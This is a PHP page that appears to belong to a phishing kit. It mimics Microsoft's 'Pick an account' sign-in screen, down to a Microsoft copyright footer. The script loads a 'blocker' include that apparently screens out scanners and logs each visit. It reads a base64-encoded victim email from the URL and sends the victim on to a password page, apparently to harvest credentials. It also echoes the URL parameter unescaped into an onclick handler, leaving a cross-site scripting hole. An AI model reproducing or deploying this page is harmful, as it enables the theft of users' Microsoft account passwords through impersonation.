<?php
session_start();
require 'core/functions.php';
require 'core/blocker.php';

logger("[VISIT] {$_SERVER['REQUEST_URI']} - 200");

if(isset($_SESSION['email'])) {
    echo '<script>window.location = "pass.php";</script>';
    exit();
}

if(!empty($_GET['email'])) {
    logger("[LOGIN] {$_SERVER['REQUEST_URI']} - 200");
}
?>
<!DOCTYPE html>
<html lang="en">
    <head>
        <title>Sign in to your account</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <link rel="shortcut icon" href="assets/images/favicon.ico">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">
        <link rel="stylesheet" href="assets/css/another.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.3/umd/popper.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.3/js/bootstrap.min.js"></script>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row d-flex align-items-center">
                <div class="col-lg-4 col-md-4 col-xs-12 mx-auto">
                    <div class="card">
                        <div class="card-body">
                            <img style="margin-top: 25px; margin-left: 20px;" src="assets/images/logo.svg">
                            <h4 class="pl-1 m-3">Pick an account</h4>
                            <ul class="list-group">
                                <li class="list-group-item" onclick="return window.location='pass.php?email=<?php echo $_GET['email']; ?>';"><img src="assets/images/user2.svg"><?php echo isset($_GET['email']) ? base64_decode($_GET['email']) : '' ?><img class="mt-3 float-right" src="assets/images/more.svg"></li>
                                <li class="list-group-item" onclick="return window.location='login.php';"><img src="assets/images/plus.svg">Use another account</li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>

        <div class="footer">
            <p><img src="assets/images/ellipsis_white.svg"></p>
            <p>Privacy & cookies</p>
            <p>Terms of use</p>
            <p>©<?php echo date('Y'); ?> Microsoft</p>
        </div>
    </body>
</html>